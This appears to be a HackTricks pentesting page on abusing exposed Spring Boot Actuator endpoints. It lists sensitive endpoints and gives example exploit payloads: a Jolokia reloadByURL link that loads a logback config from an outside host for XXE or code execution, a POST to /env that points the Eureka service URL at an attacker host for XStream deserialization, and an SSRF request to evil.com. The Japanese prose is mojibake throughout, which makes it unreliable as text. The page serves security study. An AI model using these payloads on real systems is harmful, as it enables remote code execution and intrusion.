# Spring Actuators

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
{% endhint %}

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**å‡ºå…¸** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Spring Boot Actuatorsã®æ‚ªç”¨

**å…ƒã®æŠ•ç¨¿ã‚’ç¢ºèªã—ã¦ãã ã•ã„** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **é‡è¦ãªãƒã‚¤ãƒ³ãƒˆ:**

* Spring Boot Actuatorsã¯ã€`/health`ã€`/trace`ã€`/beans`ã€`/env`ãªã©ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ç™»éŒ²ã—ã¾ã™ã€‚ãƒãƒ¼ã‚¸ãƒ§ãƒ³1ã‹ã‚‰1.4ã§ã¯ã€ã“ã‚Œã‚‰ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯èªè¨¼ãªã—ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ã€‚ãƒãƒ¼ã‚¸ãƒ§ãƒ³1.5ä»¥é™ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§éæ©Ÿå¯†ãªã®ã¯`/health`ã¨`/info`ã®ã¿ã§ã™ãŒã€é–‹ç™ºè€…ã¯ã“ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã™ã€‚
* ç‰¹å®šã®Actuatorã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã‚’éœ²å‡ºã•ã›ãŸã‚Šã€æœ‰å®³ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã—ãŸã‚Šã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
* `/dump`ã€`/trace`ã€`/logfile`ã€`/shutdown`ã€`/mappings`ã€`/env`ã€`/actuator/env`ã€`/restart`ã€ãŠã‚ˆã³`/heapdump`ã€‚
* Spring Boot 1.xã§ã¯ã€ã‚¢ã‚¯ãƒãƒ¥ã‚¨ãƒ¼ã‚¿ãƒ¼ã¯ãƒ«ãƒ¼ãƒˆURLã®ä¸‹ã«ç™»éŒ²ã•ã‚Œã¾ã™ãŒã€2.xã§ã¯`/actuator/`ãƒ™ãƒ¼ã‚¹ãƒ‘ã‚¹ã®ä¸‹ã«ã‚ã‚Šã¾ã™ã€‚

### **æ‚ªç”¨æŠ€è¡“:**

1. **'/jolokia'ã‚’ä»‹ã—ãŸãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**:
* `/jolokia`ã‚¢ã‚¯ãƒãƒ¥ã‚¨ãƒ¼ã‚¿ãƒ¼ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€MBeansã¸ã®HTTPã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã™ã‚‹Jolokiaãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’å…¬é–‹ã—ã¾ã™ã€‚
* `reloadByURL`ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€å¤–éƒ¨URLã‹ã‚‰ãƒ­ã‚°è¨­å®šã‚’å†èª­ã¿è¾¼ã¿ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ç›²ç›®çš„ãªXXEã‚„ä½œæˆã•ã‚ŒãŸXMLè¨­å®šã‚’ä»‹ã—ãŸãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* ä¾‹ã®æ‚ªç”¨URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`ã€‚
2. **'/env'ã‚’ä»‹ã—ãŸè¨­å®šå¤‰æ›´**:
* Spring Cloudãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒå­˜åœ¨ã™ã‚‹å ´åˆã€`/env`ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ç’°å¢ƒãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®å¤‰æ›´ã‚’è¨±å¯ã—ã¾ã™ã€‚
* ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€Eureka serviceURLã«ãŠã‘ã‚‹XStreamãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ãªã©ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«æ“ä½œã§ãã¾ã™ã€‚
* ä¾‹ã®æ‚ªç”¨POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **ãã®ä»–ã®æœ‰ç”¨ãªè¨­å®š**:
* `spring.datasource.tomcat.validationQuery`ã€`spring.datasource.tomcat.url`ã€ãŠã‚ˆã³`spring.datasource.tomcat.max-active`ã®ã‚ˆã†ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚„ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šæ–‡å­—åˆ—ã®å¤‰æ›´ãªã©ã€ã•ã¾ã–ã¾ãªæ‚ªç”¨ã®ãŸã‚ã«æ“ä½œã§ãã¾ã™ã€‚

### **è¿½åŠ æƒ…å ±:**

* ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¢ã‚¯ãƒãƒ¥ã‚¨ãƒ¼ã‚¿ãƒ¼ã®åŒ…æ‹¬çš„ãªãƒªã‚¹ãƒˆã¯[ã“ã¡ã‚‰](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* Spring Boot 2.xã®`/env`ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£å¤‰æ›´ã®ãŸã‚ã«JSONå½¢å¼ã‚’ä½¿ç”¨ã—ã¾ã™ãŒã€ä¸€èˆ¬çš„ãªæ¦‚å¿µã¯åŒã˜ã§ã™ã€‚

### **é–¢é€£ãƒˆãƒ”ãƒƒã‚¯:**

1. **Env + H2 RCE**:
* `/env`ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¨H2ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®çµ„ã¿åˆã‚ã›ã‚’æ‚ªç”¨ã™ã‚‹è©³ç´°ã¯[ã“ã¡ã‚‰](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
2. **ä¸æ­£ãªãƒ‘ã‚¹åè§£é‡ˆã«ã‚ˆã‚‹Spring Bootä¸Šã®SSRF**:
* Springãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®HTTPãƒ‘ã‚¹åã«ãŠã‘ã‚‹ãƒãƒˆãƒªãƒƒã‚¯ã‚¹ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆ`;`ï¼‰ã®å‡¦ç†ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆSSRFï¼‰ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«åˆ©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* ä¾‹ã®æ‚ªç”¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆ:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
</details>
{% endhint %}
